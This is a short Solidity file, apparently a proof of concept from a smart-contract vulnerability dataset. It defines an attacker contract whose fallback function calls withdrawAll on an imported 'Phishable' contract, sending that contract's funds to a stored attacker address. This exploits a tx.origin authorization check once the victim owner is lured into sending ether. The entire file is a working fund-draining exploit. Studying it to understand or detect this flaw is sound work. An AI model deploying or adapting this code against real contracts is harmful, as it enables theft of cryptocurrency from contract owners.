 pragma solidity ^0.4.22;

import "../dataset/access_control/phishable.sol";

contract PhishableAttacker {

    Phishable phishableContract;
    address attacker; // The attackers address to receive funds.

    constructor (Phishable _phishableContract, address _attackerAddress) public {
        phishableContract = _phishableContract;
        attacker = _attackerAddress;
    }

    function () payable public {
        phishableContract.withdrawAll(attacker);
    }
}